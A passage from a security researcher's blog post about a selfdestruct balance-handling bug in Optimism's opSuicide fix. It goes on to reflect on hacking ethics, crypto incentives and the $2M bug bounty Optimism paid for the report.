</span></p></blockquote><p>One of the tropes in the &#34;Bag of Hacks&#34; talk I give at hackathons and college classes is that, quite often, security fixes are done in a hurry by people who are attempting to mitigate a specific flaw and the resulting &#34;fix&#34; breaks something else.</p><p>I actually noticed this while testing Boba and Metis—which are forks of Optimism—in the middle of the night when I realized that they would also be affected (but wasn&#39;t sure if the Optimism people had reached out to them already; they had).</p><h3>What is Wrong</h3><p>In this case, the code that was added to opSuicide subtracted the prior balance from the contract to clear it. This is, to be fair, extremely reasonable behavior... I dare say it is <em>more</em> reasonable than the behavior Ethereum originally implemented ;P.</p><p>The way that the original code worked, however, is that it directly set the balance to 0. This means that if you selfdestruct to yourself, instead of 1+1-1 being 1, the resulting balance is forced to 0. I noted this in the discussion on the pull request.</p><p>(Honestly, I&#39;m actually thinking this is &#34;probably close enough&#34;, given that—as mentioned earlier—the OVM is already getting other semantics surrounding this wrong, and the result is just that money that would have been destroyed survives.)</p><p>(That said, it also wouldn&#39;t surprise me if these incompatibilities between the EVM and the OVM can be compounded with assumptions made by various contracts people might choose to deploy to expose and exploit other vulnerabilities.)</p><div><div><p>What follows is me being &#34;super real&#34; and attempting to enter into a particularly deep conversation about morality. Conversations like this are, in some sense, the dessert at the end of a long meal. The tech is over, but maybe you&#39;d like to stay for a bit?</p><p>I partly say this because <a href="https://daringfireball.net/linked/2009/09/15/apple-sig-server">some people</a>—who I notably <em>do not</em> consider part of &#34;my audience&#34; ;P—<em>hate this stuff</em>; but, I also say this because I want to be clear: these are vulnerable thoughts that people don&#39;t say out loud enough.</p><p>That said, I also sometimes think that these conversations only really work when done in person, during the third hour of a five-hour late-night Q&amp;A session at a hackathon like <a href="https://twitter.com/SpartaHack">SpartaHack</a>. OMG do I miss attending in-person SpartaHack :(.</p></div></div><h3>Crypto Ethi-nomi-cs</h3><p>Something I tend to spend a lot of time talking about—as a &#34;grey hat&#34; security researcher who works in a field where we routinely hoard bugs and drop full weaponized exploits of 0-day vulnerabilities (our jailbreaks)—is &#34;the ethics of hacking&#34;.</p><p>In the case of limited hardware and the fight against digital rights management (which includes use of Intel SGX, the reason I take issue with MobileCoin) the moral tradeoffs have become somewhat clear to me over the years.</p><p>However, working with cryptocurrencies feels a lot murkier. Do we <em>truly believe</em> that &#34;code is law&#34;, and if someone finds a bug that lets them walk away with a billion dollars everyone should think &#34;I guess I made a mistake&#34;?</p><p>If you do, does your decision on that front change if you aren&#39;t going to personally profit, but will instead destroy a system people were using? FWIW, no matter how much we say &#34;code is law&#34;, I personally have a hard time with destruction as ethical.</p><p>And yet, if we do not believe that destruction is ethical, and we are going to assign such strong <em>moral</em> judgement to people who destroy rather than build, how can we avoid falling into the trap of building systems that only work due to trust?</p><h3>Move Fast and Lose Cash</h3><p>So, one of the more &#34;fun&#34; things about working in crypto is exactly what makes it &#34;scary&#34;: the (monetary) stakes tend to be extremely high. One ramification of this is that security research matters a lot more than in other fields of software.</p><p>And yet, a complaint that I too often have about crypto projects is that they sometimes seem to play fast and loose with consensus or correctness while they &#34;move fast and break things&#34; their way to access large amounts of investment capital.</p><p>Meanwhile, projects that take more conservative approaches are seen to &#34;move slowly and too carefully&#34;; and, as with Web 2.0 companies that spend &#34;too much&#34; time protecting user privacy before launching new features, they are at a disadvantage.</p><p>I thereby sometimes balk at &#34;helping&#34; other projects with basic issues of decentralization or security, as I feel like those can&#39;t be afterthoughts: this stuff is too important to be releasing quickly and adjusting the design in the field.</p><p>And yet, we see crypto project after crypto project trying to externalize the cost of their <em>core design</em> to people being only indirectly compensated, rather than building a team around mathematicians, economists, and security experts.</p><h3>Financial Invectives</h3><p>Meanwhile, there&#39;s a kind of fishy thing going on with many crypto projects, with what can feel like a &#34;dark pattern&#34; arising wherein projects force users to become invested in their project (by way of a token) to merely be customers.</p><p>The result is that it can be hard to trust anyone anymore, as seemingly every single participant—even ones that classically would have tried to remain neutral—suddenly are being pushed around by carefully designed monetary incentives.</p><p>To draw a realistic-to-crypto analogy: imagine if using Apple Music involved not a subscription fee, but proving you own some value in shares of Apple&#39;s stock. Now, if Apple goes up in value, so do the shares you are required to hold.</p><p>This thought demoralizes me at times (and I will note that Orchid has avoided such models). And yet, is this even new? Are &#34;Apple fanbois&#34; accidentally incentivized by their expensive hardware investment (and later resale value)?</p><div><div><p>I actually have been meaning to write an article on what I feel is a form of &#34;runaway incentives&#34; on the supply side—as opposed to with consumers—of some crypto projects, a topic I have occasionally written about so far only in random comments on Hacker News, GitHub, and Twitter.</p><p>If you would be interested in reading such, I recommend following <a href="https://twitter.com/saurik">me on Twitter</a>. I also am usually quite open to giving (for free! I am a politician in California and don&#39;t want to deal with <a href="https://www.fppc.ca.gov/content/dam/fppc/NS-Documents/TAD/Public%20Officials%20and%20Employees/LocalGiftFactSheet_Final_2021%20Version_2.pdf">the honoraria restrictions</a>) talks at hackathons or conferences, particularly if I don&#39;t have to travel far.</p></div></div><h3>Exploitation Games</h3><p>I&#39;ve been working on incubating &#34;exploits&#34; (nothing else like this bug, to be clear) for a number of projects (&#34;as one does&#34; in security), and the discussion constantly comes up about &#34;what to do with them&#34;; and the answer just isn&#39;t at all obvious.</p><p>People discuss—sometimes clearly in jest, sometimes... <em>not so much</em> ;P—ways to profit off of hacks by releasing &#34;epic takedowns&#34; of various projects and shorting your way to riches, or start plotting &#34;the perfect crime&#34; (usually quite fanciful).</p><p>Over the years, I have heard many stories from hackers I have worked with—including both geohot and my good friends at <a href="https://exploitee.rs/">exploitee.rs</a>—about bug bounty programs, but have never myself sought out or tried to participate in one.</p><p>I&#39;ve often then felt that there just isn&#39;t <em>enough</em> &#34;friendly&#34; adversarialism in the crypto community. I&#39;d love to see a conference where every single talk is &#34;why protocol X will never work&#34; without that being seen as &#34;unconstructive&#34;.</p><p>I thereby tend to actually gravitate strongly towards projects that are willing to take a hard line with other projects and &#34;duke it out&#34; in benchmarks, articles, or analysis, calling out scams rather than merely ignoring them.</p><h3>Bountiful Bug Bounties</h3><p>Which finally brings me back to this Optimism bug. I needed a talk to give at ETHDenver (due to a scheduling SNAFU) and I saw that Optimism listed <a href="https://immunefi.com/bounty/optimism/">a bounty with Immunefi that has a $2,000,042 maximum payout</a> for &#34;critical&#34; bugs.</p><p>(Technically, their Immunefi program did not cover this bug, as it is not in the explicit scope, so I couldn&#39;t go through Immunefi and had to reach out directly. But they have been extremely gracious and immediately said they would cover it equivalently.)</p><p>The program from Optimism isn&#39;t even the highest maximum listed on Immunefi: <a href="https://www.olympusdao.finance/">Olympus</a>, which describes itself as &#34;a decentralized reserve currency&#34;, has <a href="https://immunefi.com/bounty/olympus/">a bug bounty program listed</a> with a maximum payout of $3,333,333!</p><p>This then gave me not one but two incentives to &#34;bother with&#34; dropping everything else I was doing to deeply analyze &#34;that thing I saw that felt off but do I really care to look as I need to work on my own project (or even take a nap)&#34;.</p><h3>Feeling Optimistic</h3><p>And, in fact, <a href="https://medium.com/@optimismpbc/disclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94">Optimism decided to award the full $2M+42</a>; ...which has the property of retroactively compensating me for the copious time I&#39;ve spent analyzing their project this past year, as if I had been a team member.</p><p>(Which causes yet another interesting incentive alignment: I now feel &#34;quite a bit grateful&#34; to Optimism, and have come to like them more because of this award... maybe you shouldn&#39;t trust what I say about them? ;P)</p><p>We can also maybe feel good that the existence of this large bounty did what it set out to do: Optimism made a mistake, but they then incentivized—and quite generously so!—the work to correct it, protecting their users from loss.</p><p>(BTW, Boba and Metis—both forks of Optimism—had <a href="https://docs.boba.network/bug-bounty">a max $100,000</a> and <a href="https://immunefi.com/bounty/metis/">a max $1,000,000</a> bounty, respectively. It is an interesting question in some sense: should they share the responsibility of such a bounty?)</p><p>If nothing else, I successfully scored an invite to <a href="https://www.eventbrite.com/e/the-multi-chain-party-hosted-by-ankr-metis-boba-and-polygon-tickets-262095172717">their party at ETHDenver</a> ;P. Maybe I&#39;ll see some of you there!</p></div></div>
  </body>
</html>
